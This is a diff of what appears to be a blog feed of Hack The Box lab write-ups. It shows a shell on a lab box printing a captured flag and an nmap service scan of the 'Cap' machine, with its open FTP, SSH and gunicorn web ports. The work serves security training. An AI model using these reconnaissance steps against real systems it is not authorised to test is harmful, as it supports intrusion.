+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Android Download Music  Pictures      Ringtones dianxinos
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/sdcard $ ca
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cal             cameraserver    case            cat             catv
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:/sdcard $ cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f32017174c7c7e8f50c6da52891ae250
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
     </item>
     
     <item>
@@ -297,126 +297,126 @@ Difficulty: Easy&lt;/p&gt;
 &lt;p&gt;ip=10.10.10.245&lt;/p&gt;
 &lt;h2 id=&#34;user-solution&#34;&gt;User solution&lt;/h2&gt;
 &lt;p&gt;The first thing is to do the nmap scan.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Cap]
-└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 11:08 EDT
-Nmap scan report for 10.10.10.245
-Host is up (0.090s latency).
-
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
-|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
-|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
-80/tcp open  http    gunicorn
-| fingerprint-strings:
-|   FourOhFourRequest:
-|     HTTP/1.0 404 NOT FOUND
-|     Server: gunicorn
-|     Date: Sat, 26 Jun 2021 15:08:48 GMT
-|     Connection: close
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 232
-|     &amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//W3C//DTD HTML 3.2 Final//EN&amp;quot;&amp;gt;
-|     &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
-|     &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
-|     &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/p&amp;gt;
-|   GetRequest:
-|     HTTP/1.0 200 OK
-|     Server: gunicorn
-|     Date: Sat, 26 Jun 2021 15:08:41 GMT
-|     Connection: close
-|     Content-Type: text/html; charset=utf-8
-|     Content-Length: 19386
-|     &amp;lt;!DOCTYPE html&amp;gt;
-|     &amp;lt;html class=&amp;quot;no-js&amp;quot; lang=&amp;quot;en&amp;quot;&amp;gt;
-|     &amp;lt;head&amp;gt;
-|     &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
-|     &amp;lt;meta http-equiv=&amp;quot;x-ua-compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
-|     &amp;lt;title&amp;gt;Security Dashboard&amp;lt;/title&amp;gt;
-|     &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt;
-|     &amp;lt;link rel=&amp;quot;shortcut icon&amp;quot; type=&amp;quot;image/png&amp;quot; href=&amp;quot;/static/images/icon/favicon.ico&amp;quot;&amp;gt;
-|     &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/css/bootstrap.min.css&amp;quot;&amp;gt;
-|     &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/css/font-awesome.min.css&amp;quot;&amp;gt;
-|     &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/css/themify-icons.css&amp;quot;&amp;gt;
-|     &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/css/metisMenu.css&amp;quot;&amp;gt;
-|     &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/css/owl.carousel.min.css&amp;quot;&amp;gt;
-|     &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/css/slicknav.min.css&amp;quot;&amp;gt;
-|     &amp;lt;!-- amchar
-|   HTTPOptions:
-|     HTTP/1.0 200 OK
-|     Server: gunicorn
-|     Date: Sat, 26 Jun 2021 15:08:41 GMT
-|     Connection: close
-|     Content-Type: text/html; charset=utf-8
-|     Allow: HEAD, OPTIONS, GET
-|     Content-Length: 0
-|   RTSPRequest:
-|     HTTP/1.1 400 Bad Request
-|     Connection: close
-|     Content-Type: text/html
-|     Content-Length: 196
-|     &amp;lt;html&amp;gt;
-|     &amp;lt;head&amp;gt;
-|     &amp;lt;title&amp;gt;Bad Request&amp;lt;/title&amp;gt;
-|     &amp;lt;/head&amp;gt;
-|     &amp;lt;body&amp;gt;
-|     &amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;
-|     Invalid HTTP Version &amp;amp;#x27;Invalid HTTP Version: &amp;amp;#x27;RTSP/1.0&amp;amp;#x27;&amp;amp;#x27;
-|     &amp;lt;/body&amp;gt;
-|_    &amp;lt;/html&amp;gt;
-|_http-server-header: gunicorn
-|_http-title: Security Dashboard
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port80-TCP:V=7.91%I=7%D=6/26%Time=60D742F4%P=x86_64-pc-linux-gnu%r(GetR
-SF:equest,2555,&amp;quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
-SF:Sat,\x2026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\
-SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
-SF:86\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html\x20class=\&amp;quot;no-js\&amp;quot;\x20lang=\&amp;quot;en\&amp;quot;&amp;gt;\
-SF:n\n&amp;lt;head&amp;gt;\n\x20\x20\x20\x20&amp;lt;meta\x20charset=\&amp;quot;utf-8\&amp;quot;&amp;gt;\n\x20\x20\x20\x2
-SF:0&amp;lt;meta\x20http-equiv=\&amp;quot;x-ua-compatible\&amp;quot;\x20content=\&amp;quot;ie=edge\&amp;quot;&amp;gt;\n\x20\
-SF:x20\x20\x20&amp;lt;title&amp;gt;Security\x20Dashboard&amp;lt;/title&amp;gt;\n\x20\x20\x20\x20&amp;lt;meta\
-SF:x20name=\&amp;quot;viewport\&amp;quot;\x20content=\&amp;quot;width=device-width,\x20initial-scale=
-SF:1\&amp;quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;quot;shortcut\x20icon\&amp;quot;\x20type=\&amp;quot;image
-SF:/png\&amp;quot;\x20href=\&amp;quot;/static/images/icon/favicon\.ico\&amp;quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;
-SF:link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;/static/css/bootstrap\.min\.css\&amp;quot;&amp;gt;
-SF:\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;/static/css/fon
-SF:t-awesome\.min\.css\&amp;quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20
-SF:href=\&amp;quot;/static/css/themify-icons\.css\&amp;quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=
-SF:\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;/static/css/metisMenu\.css\&amp;quot;&amp;gt;\n\x20\x20\x20\x2
-SF:0&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;/static/css/owl\.carousel\.min\.
-SF:css\&amp;quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;/static/c
-SF:ss/slicknav\.min\.css\&amp;quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;!--\x20amchar&amp;quot;)%r(HTTPOption
-SF:s,B3,&amp;quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,\x2
-SF:026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\nConten
-SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
-SF:20GET\r\nContent-Length:\x200\r\n\r\n&amp;quot;)%r(RTSPRequest,121,&amp;quot;HTTP/1\.1\x2
-SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
-SF:/html\r\nContent-Length:\x20196\r\n\r\n&amp;lt;html&amp;gt;\n\x20\x20&amp;lt;head&amp;gt;\n\x20\x20
-SF:\x20\x20&amp;lt;title&amp;gt;Bad\x20Request&amp;lt;/title&amp;gt;\n\x20\x20&amp;lt;/head&amp;gt;\n\x20\x20&amp;lt;body&amp;gt;\
-SF:n\x20\x20\x20\x20&amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad\x20Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;\n\x20\x20\x20\x20Invali
-SF:d\x20HTTP\x20Version\x20&amp;amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;amp;#x27;RTSP
-SF:/1\.0&amp;amp;#x27;&amp;amp;#x27;\n\x20\x20&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n&amp;quot;)%r(FourOhFourRequest,189
-SF:,&amp;quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20S
-SF:at,\x2026\x20Jun\x202021\x2015:08:48\x20GMT\r\nConnection:\x20close\r\n
-SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
-SF:r\n\r\n&amp;lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&amp;quot;-//W3C//DTD\x20HTML\x203\.2\x20
-SF:Final//EN\&amp;quot;&amp;gt;\n&amp;lt;title&amp;gt;404\x20Not\x20Found&amp;lt;/title&amp;gt;\n&amp;lt;h1&amp;gt;Not\x20Found&amp;lt;/h1&amp;gt;
-SF:\n&amp;lt;p&amp;gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
-SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
-SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&amp;lt;/p&amp;gt;\n&amp;quot;);
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 136.54 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;About the website serving on port 80.
-The website is about security details related to the server. The Dashboard shows line graph no. of Security events, failed logins and UDP scans. A user named Nathan is logged in and the &amp;lsquo;log-out&amp;rsquo; button doesn&amp;rsquo;t seems to work.&lt;/p&gt;
-&lt;p&gt;There are other 3 pages for &amp;lsquo;5 sec PCAP analysis&amp;rsquo;, &amp;lsquo;ipconfig&amp;rsquo; and &amp;lsquo;network status&amp;rsquo;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Cap]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 11:08 EDT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report for 10.10.10.245
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up (0.090s latency).
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;21/tcp open  ftp     vsftpd 3.0.3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    gunicorn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| fingerprint-strings:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   FourOhFourRequest:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     HTTP/1.0 404 NOT FOUND
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Server: gunicorn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Date: Sat, 26 Jun 2021 15:08:48 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Type: text/html; charset=utf-8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Length: 232
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;!DOCTYPE HTML PUBLIC &amp;#34;-//W3C//DTD HTML 3.2 Final//EN&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/p&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   GetRequest:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     HTTP/1.0 200 OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Server: gunicorn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Date: Sat, 26 Jun 2021 15:08:41 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Type: text/html; charset=utf-8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Length: 19386
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;!DOCTYPE html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;html class=&amp;#34;no-js&amp;#34; lang=&amp;#34;en&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;meta http-equiv=&amp;#34;x-ua-compatible&amp;#34; content=&amp;#34;ie=edge&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;title&amp;gt;Security Dashboard&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;link rel=&amp;#34;shortcut icon&amp;#34; type=&amp;#34;image/png&amp;#34; href=&amp;#34;/static/images/icon/favicon.ico&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/font-awesome.min.css&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/themify-icons.css&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/metisMenu.css&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/owl.carousel.min.css&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/slicknav.min.css&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;!-- amchar
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   HTTPOptions:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     HTTP/1.0 200 OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Server: gunicorn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Date: Sat, 26 Jun 2021 15:08:41 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Type: text/html; charset=utf-8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Allow: HEAD, OPTIONS, GET
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Length: 0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   RTSPRequest:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     HTTP/1.1 400 Bad Request
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Type: text/html
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Content-Length: 196
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;title&amp;gt;Bad Request&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;/head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     Invalid HTTP Version &amp;amp;#x27;Invalid HTTP Version: &amp;amp;#x27;RTSP/1.0&amp;amp;#x27;&amp;amp;#x27;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|     &amp;lt;/body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_    &amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: gunicorn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Security Dashboard
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF-Port80-TCP:V=7.91%I=7%D=6/26%Time=60D742F4%P=x86_64-pc-linux-gnu%r(GetR
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:equest,2555,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:Sat,\x2026\x20Jun\x202021\x2015:08:41\x20GMT\r\nConnection:\x20close\r\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:86\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html\x20class=\&amp;#34;no-js\&amp;#34;\x20lang=\&amp;#34;en\&amp;#34;&amp;gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:n\n&amp;lt;head&amp;gt;\n\x20\x20\x20\x20&amp;lt;meta\x20charset=\&amp;#34;utf-8\&amp;#34;&amp;gt;\n\x20\x20\x20\x2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:0&amp;lt;meta\x20http-equiv=\&amp;#34;x-ua-compatible\&amp;#34;\x20content=\&amp;#34;ie=edge\&amp;#34;&amp;gt;\n\x20\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:x20\x20\x20&amp;lt;title&amp;gt;Security\x20Dashboard&amp;lt;/title&amp;gt;\n\x20\x20\x20\x20&amp;lt;meta\
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:x20name=\&amp;#34;viewport\&amp;#34;\x20content=\&amp;#34;width=device-width,\x20initial-scale=
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:1\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;shortcut\x20icon\&amp;#34;\x20type=\&amp;#34;image
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:/png\&amp;#34;\x20href=\&amp;#34;/static/images/icon/favicon\.ico\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/bootstrap\.min\.css\&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/fon
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:t-awesome\.min\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:href=\&amp;#34;/static/css/themify-icons\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/metisMenu\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:0&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/css/owl\.carousel\.min\.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/static/c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:ss/slicknav\.min\.css\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;!--\x20amchar&amp;#34;)%r(HTTPOption
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SF:s,B3,&amp;#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,\x2
